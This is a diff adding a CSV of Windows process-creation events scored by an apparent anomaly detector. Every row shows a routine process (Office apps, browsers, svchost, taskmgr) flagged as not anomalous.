@@ -1,0 +1,506 @@
+EventID,Timestamp,ProcessName,ParentProcessName,CommandLine,anomaly_label,anomaly_score,is_anomaly
+1,2026-04-30T08:32:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_k8ws.docx,1,0.0660449135663711,False
+1,2026-04-30T08:32:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.06448663585408998,False
+1,2026-04-30T08:34:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_mHaM.xlsx,1,0.08212985639931647,False
+1,2026-04-30T08:37:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_s48V.xlsx,1,0.08212985639931647,False
+1,2026-04-30T08:38:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_qzPH.xlsx,1,0.08212985639931647,False
+1,2026-04-30T08:52:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.06043616782440131,False
+1,2026-04-30T08:59:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_vbGE.docx,1,0.0660449135663711,False
+1,2026-04-30T08:59:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.02438526899384874,False
+1,2026-04-30T09:03:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_n1yt.txt,1,0.060906657685670273,False
+1,2026-04-30T09:06:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.05855008036625087,False
+1,2026-04-30T09:07:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_fKSG.xlsx,1,0.10408638917149993,False
+1,2026-04-30T09:08:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_brXA.txt,1,0.060906657685670273,False
+1,2026-04-30T09:10:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.08285963101333482,False
+1,2026-04-30T09:15:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=2244,1,0.05331136156787397,False
+1,2026-04-30T09:21:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_NoUt.docx,1,0.08286678193755082,False
+1,2026-04-30T09:22:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=5733,1,0.05331136156787397,False
+1,2026-04-30T09:32:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=6327,1,0.03591375590604151,False
+1,2026-04-30T09:35:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=2401,1,0.05331136156787397,False
+1,2026-04-30T09:38:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.07760983185140491,False
+1,2026-04-30T09:41:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_3AsF.docx,1,0.08286678193755082,False
+1,2026-04-30T09:44:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.08285963101333482,False
+1,2026-04-30T09:45:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_FWqj.xlsx,1,0.10408638917149993,False
+1,2026-04-30T09:46:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=3916,1,0.03591375590604151,False
+1,2026-04-30T09:46:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_h8ZO.xlsx,1,0.10408638917149993,False
+1,2026-04-30T09:48:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=8572,1,0.05331136156787397,False
+1,2026-04-30T09:49:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.08285963101333482,False
+1,2026-04-30T09:50:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_aFrs.xlsx,1,0.10408638917149993,False
+1,2026-04-30T09:51:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_LKOd.xlsx,1,0.10408638917149993,False
+1,2026-04-30T09:56:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_LdiS.docx,1,0.08286678193755082,False
+1,2026-04-30T09:58:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.05855008036625087,False
+1,2026-04-30T10:05:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.05747785693712559,False
+1,2026-04-30T10:05:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.07247729679535875,False
+1,2026-04-30T10:17:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.09267530559299597,False
+1,2026-04-30T10:19:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.07247729679535875,False
+1,2026-04-30T10:20:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=8386,1,0.048749482066093974,False
+1,2026-04-30T10:20:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_vgSJ.xlsx,1,0.10298673735810998,False
+1,2026-04-30T10:27:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.09267530559299597,False
+1,2026-04-30T10:28:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.09116367576557216,False
+1,2026-04-30T10:37:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.07247729679535875,False
+1,2026-04-30T10:49:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.09267530559299597,False
+1,2026-04-30T10:50:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.07247729679535875,False
+1,2026-04-30T10:53:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_CjGJ.docx,1,0.08485826395989704,False
+1,2026-04-30T10:53:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_M3u7.docx,1,0.08485826395989704,False
+1,2026-04-30T10:56:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_y3Az.txt,1,0.06837201418236116,False
+1,2026-04-30T10:56:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=4131,1,0.048749482066093974,False
+1,2026-04-30T10:57:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_Tls4.txt,1,0.06837201418236116,False
+1,2026-04-30T11:01:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_1hKO.docx,1,0.09087169747189672,False
+1,2026-04-30T11:01:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_dIaX.docx,1,0.09087169747189672,False
+1,2026-04-30T11:02:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_wNB8.xlsx,1,0.11597319802176559,False
+1,2026-04-30T11:05:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_r4ys.docx,1,0.09087169747189672,False
+1,2026-04-30T11:09:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.08213984898467075,False
+1,2026-04-30T11:09:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_52OZ.xlsx,1,0.11597319802176559,False
+1,2026-04-30T11:14:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_3liV.txt,1,0.07487811742438599,False
+1,2026-04-30T11:15:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_vWFL.xlsx,1,0.11597319802176559,False
+1,2026-04-30T11:15:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=7769,1,0.06254077537614722,False
+1,2026-04-30T11:17:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.10208486557809549,False
+1,2026-04-30T11:17:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_TmRr.xlsx,1,0.11597319802176559,False
+1,2026-04-30T11:18:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.09776348472163943,False
+1,2026-04-30T11:19:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=9925,1,0.06254077537614722,False
+1,2026-04-30T11:19:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_WWIc.docx,1,0.09087169747189672,False
+1,2026-04-30T11:20:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.08213984898467075,False
+1,2026-04-30T11:22:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.10208486557809549,False
+1,2026-04-30T11:27:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=8608,1,0.07315890526805724,False
+1,2026-04-30T11:33:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.08213984898467075,False
+1,2026-04-30T11:35:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=2226,1,0.06254077537614722,False
+1,2026-04-30T11:41:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_27p6.txt,1,0.07487811742438599,False
+1,2026-04-30T11:45:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.08213984898467075,False
+1,2026-04-30T11:55:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_zDsQ.xlsx,1,0.11597319802176559,False
+1,2026-04-30T11:55:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.10208486557809549,False
+1,2026-04-30T11:58:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.08213984898467075,False
+1,2026-04-30T12:01:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.10723724247117455,False
+1,2026-04-30T12:02:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=3652,1,0.09000198132711723,False
+1,2026-04-30T12:08:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_xNIf.xlsx,1,0.11207548025379849,False
+1,2026-04-30T12:17:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.08797257004613579,False
+1,2026-04-30T12:23:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.07596787283684303,False
+1,2026-04-30T12:23:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=9704,1,0.09000198132711723,False
+1,2026-04-30T12:27:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=8177,1,0.06557399401830566,False
+1,2026-04-30T12:41:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_Vuq9.xlsx,1,0.11207548025379849,False
+1,2026-04-30T12:41:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_1GPc.xlsx,1,0.11207548025379849,False
+1,2026-04-30T12:43:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=9372,1,0.09000198132711723,False
+1,2026-04-30T12:46:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.07596787283684303,False
+1,2026-04-30T12:48:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=8605,1,0.09000198132711723,False
+1,2026-04-30T12:55:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=7587,1,0.06557399401830566,False
+1,2026-04-30T12:57:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_MoJs.txt,1,0.0811888137744674,False
+1,2026-04-30T12:59:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.08797257004613579,False
+1,2026-04-30T13:00:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_kPeN.txt,1,0.09682793480801283,False
+1,2026-04-30T13:03:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.10421702231276975,False
+1,2026-04-30T13:03:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.11005315980361735,False
+1,2026-04-30T13:04:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_fbHx.txt,1,0.09682793480801283,False
+1,2026-04-30T13:08:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.08295032732845908,False
+1,2026-04-30T13:10:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=1033,1,0.0957355524867442,False
+1,2026-04-30T13:17:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.10421702231276975,False
+1,2026-04-30T13:22:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_dFRK.xlsx,1,0.1109876024311629,False
+1,2026-04-30T13:23:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=9726,1,0.07443345053174621,False
+1,2026-04-30T13:25:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_osxJ.xlsx,1,0.1109876024311629,False
+1,2026-04-30T13:28:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.10421702231276975,False
+1,2026-04-30T13:29:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.10421702231276975,False
+1,2026-04-30T13:29:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.11522806052334633,False
+1,2026-04-30T13:31:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.11522806052334633,False
+1,2026-04-30T13:37:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.08295032732845908,False
+1,2026-04-30T13:38:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_euZp.txt,1,0.09682793480801283,False
+1,2026-04-30T13:41:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.11522806052334633,False
+1,2026-04-30T13:42:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_JJ8Z.txt,1,0.09682793480801283,False
+1,2026-04-30T13:42:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.10421702231276975,False
+1,2026-04-30T13:43:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=1071,1,0.0957355524867442,False
+1,2026-04-30T13:46:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=3779,1,0.0957355524867442,False
+1,2026-04-30T13:48:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.10421702231276975,False
+1,2026-04-30T13:49:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.08295032732845908,False
+1,2026-04-30T13:49:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.10421702231276975,False
+1,2026-04-30T13:49:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_ClbA.docx,1,0.08437045520209496,False
+1,2026-04-30T13:49:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_Spzs.txt,1,0.09682793480801283,False
+1,2026-04-30T13:58:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.11005315980361735,False
+1,2026-04-30T14:03:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_hAD9.txt,1,0.09333611864033464,False
+1,2026-04-30T14:06:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=8060,1,0.08951012089142973,False
+1,2026-04-30T14:08:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.09212362898203919,False
+1,2026-04-30T14:08:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_LBWF.xlsx,1,0.11315818195402189,False
+1,2026-04-30T14:09:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_GZXK.xlsx,1,0.11315818195402189,False
+1,2026-04-30T14:11:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_tNUb.xlsx,1,0.11315818195402189,False
+1,2026-04-30T14:20:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=2182,1,0.09579280715030702,False
+1,2026-04-30T14:28:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.11803420272614007,False
+1,2026-04-30T14:30:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=1215,1,0.09579280715030702,False
+1,2026-04-30T14:34:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=8901,1,0.08951012089142973,False
+1,2026-04-30T14:35:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.11803420272614007,False
+1,2026-04-30T14:38:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.11731116316545853,False
+1,2026-04-30T14:38:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.11731116316545853,False
+1,2026-04-30T14:41:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_LJUx.docx,1,0.0805840278350678,False
+1,2026-04-30T14:43:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.11731116316545853,False
+1,2026-04-30T14:43:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_aFBw.docx,1,0.0805840278350678,False
+1,2026-04-30T14:45:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.11731116316545853,False
+1,2026-04-30T14:46:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=7587,1,0.08951012089142973,False
+1,2026-04-30T14:47:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=6199,1,0.08951012089142973,False
+1,2026-04-30T14:57:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.11803420272614007,False
+1,2026-04-30T14:59:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.11731116316545853,False
+1,2026-04-30T14:59:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=5326,1,0.08951012089142973,False
+1,2026-04-30T15:05:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=2330,1,0.09757838244961814,False
+1,2026-04-30T15:05:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.12343390190490577,False
+1,2026-04-30T15:09:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.12343390190490577,False
+1,2026-04-30T15:13:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.09445027629209557,False
+1,2026-04-30T15:14:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_WykE.xlsx,1,0.11441106611040419,False
+1,2026-04-30T15:18:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.08247324342008988,False
+1,2026-04-30T15:21:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=5731,1,0.08920007447042133,False
+1,2026-04-30T15:23:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_3Gcb.xlsx,1,0.11441106611040419,False
+1,2026-04-30T15:25:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.09445027629209557,False
+1,2026-04-30T15:27:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_DFzk.txt,1,0.09310751874193934,False
+1,2026-04-30T15:29:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_8rem.xlsx,1,0.11441106611040419,False
+1,2026-04-30T15:30:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=6852,1,0.08920007447042133,False
+1,2026-04-30T15:35:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.08247324342008988,False
+1,2026-04-30T15:36:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.12343390190490577,False
+1,2026-04-30T15:42:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=7630,1,0.09757838244961814,False
+1,2026-04-30T15:42:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.09445027629209557,False
+1,2026-04-30T15:45:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.11752696655622696,False
+1,2026-04-30T15:49:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.12343390190490577,False
+1,2026-04-30T15:53:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.08247324342008988,False
+1,2026-04-30T15:56:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_xVRW.docx,1,0.08283815150086105,False
+1,2026-04-30T15:59:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=3219,1,0.08920007447042133,False
+1,2026-04-30T16:06:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.11938737629249441,False
+1,2026-04-30T16:07:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_e5Q8.txt,1,0.10203615038848024,False
+1,2026-04-30T16:09:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=8298,1,0.09956746630976165,False
+1,2026-04-30T16:11:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.11938737629249441,False
+1,2026-04-30T16:13:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_OnGI.docx,1,0.09170639863946728,False
+1,2026-04-30T16:14:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_msFa.txt,1,0.10203615038848024,False
+1,2026-04-30T16:15:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_OvPU.docx,1,0.09170639863946728,False
+1,2026-04-30T16:18:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_QyG1.txt,1,0.10203615038848024,False
+1,2026-04-30T16:21:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.11938737629249441,False
+1,2026-04-30T16:26:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=8268,1,0.08957800088201984,False
+1,2026-04-30T16:28:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_DCK0.xlsx,1,0.11433283636679031,False
+1,2026-04-30T16:28:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=5819,1,0.09956746630976165,False
+1,2026-04-30T16:29:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_c2hy.xlsx,1,0.11433283636679031,False
+1,2026-04-30T16:30:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=1964,1,0.08957800088201984,False
+1,2026-04-30T16:31:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_lXP8.txt,1,0.10203615038848024,False
+1,2026-04-30T16:31:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_YZga.xlsx,1,0.11433283636679031,False
+1,2026-04-30T16:32:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.09591561546711597,False
+1,2026-04-30T16:36:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.09591561546711597,False
+1,2026-04-30T16:36:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.09591561546711597,False
+1,2026-04-30T16:39:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.09591561546711597,False
+1,2026-04-30T16:43:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_UUFi.docx,1,0.09170639863946728,False
+1,2026-04-30T16:45:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_XQYb.docx,1,0.09170639863946728,False
+1,2026-04-30T16:49:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=4194,1,0.08957800088201984,False
+1,2026-04-30T16:49:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.07936121349041259,False
+1,2026-04-30T16:54:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=2183,1,0.08957800088201984,False
+1,2026-04-30T16:57:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=2454,1,0.09956746630976165,False
+1,2026-04-30T17:00:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_IWri.xlsx,1,0.11647791641566907,False
+1,2026-04-30T17:03:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_rctT.xlsx,1,0.11647791641566907,False
+1,2026-04-30T17:07:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.11935660474308357,False
+1,2026-04-30T17:10:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.11935660474308357,False
+1,2026-04-30T17:14:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=6218,1,0.0988466472839668,False
+1,2026-04-30T17:15:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=5229,1,0.08062382269342261,False
+1,2026-04-30T17:17:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=8951,1,0.08062382269342261,False
+1,2026-04-30T17:22:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.09552115631555419,False
+1,2026-04-30T17:28:13.752914,msedge.exe,explorer.exe,msedge.exe --type=renderer --lang=en-US --variations-seed-version=4474,1,0.08062382269342261,False
+1,2026-04-30T17:29:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.12500628466320396,False
+1,2026-04-30T17:36:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_wwyw.xlsx,1,0.11647791641566907,False
+1,2026-04-30T17:37:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_JvCh.txt,1,0.10078450337032269,False
+1,2026-04-30T17:38:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.09552115631555419,False
+1,2026-04-30T17:39:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.12500628466320396,False
+1,2026-04-30T17:41:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_zewC.txt,1,0.10078450337032269,False
+1,2026-04-30T17:44:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_rYdA.docx,1,0.08751756494254515,False
+1,2026-04-30T17:46:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.11935660474308357,False
+1,2026-04-30T17:46:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=9917,1,0.0988466472839668,False
+1,2026-04-30T17:47:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=2658,1,0.0988466472839668,False
+1,2026-04-30T17:47:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_KDNb.xlsx,1,0.11647791641566907,False
+1,2026-04-30T17:49:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_8vu7.txt,1,0.10078450337032269,False
+1,2026-04-30T17:55:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=4587,1,0.0988466472839668,False
+1,2026-04-30T17:55:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.07871047176443569,False
+1,2026-04-30T17:58:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_ofRj.txt,1,0.10078450337032269,False
+1,2026-04-30T18:06:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_RhvK.txt,1,0.0852021844774572,False
+1,2026-04-30T18:07:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=6615,1,0.08484462110920266,False
+1,2026-04-30T18:09:13.752914,word.exe,explorer.exe,word.exe C:\Users\user\Documents\draft_msTL.docx,1,0.08457636116347345,False
+1,2026-04-30T18:09:13.752914,notepad.exe,explorer.exe,notepad.exe C:\Users\user\Desktop\notes_hTDL.txt,1,0.0852021844774572,False
+1,2026-04-30T18:11:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.08452294706501351,False
+1,2026-04-30T18:12:13.752914,svchost.exe,services.exe,svchost.exe -k netsvcs,1,0.08939953401010681,False
+1,2026-04-30T18:12:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.08452294706501351,False
+1,2026-04-30T18:27:13.752914,excel.exe,explorer.exe,excel.exe C:\Users\user\Documents\report_gGH6.xlsx,1,0.10627305351416283,False
+1,2026-04-30T18:30:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.12699356797752243,False
+1,2026-04-30T18:30:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.11618178799330764,False
+1,2026-04-30T18:35:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.11618178799330764,False
+1,2026-04-30T18:40:13.752914,taskmgr.exe,explorer.exe,taskmgr.exe,1,0.11618178799330764,False
+1,2026-04-30T18:40:13.752914,chrome.exe,explorer.exe,chrome.exe --type=renderer --lang=en-US --variations-seed-version=2486,1,0.08484462110920266,False
+1,2026-04-30T18:41:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.12699356797752243,False
+1,2026-04-30T18:45:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.08452294706501351,False
+1,2026-04-30T18:47:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.12699356797752243,False
+1,2026-04-30T18:47:13.752914,explorer.exe,userinit.exe,explorer.exe,1,0.08452294706501351,False
+1,2026-04-30T18:52:13.752914,conhost.exe,cmd.exe,conhost.exe,1,0.12699356797752243,False
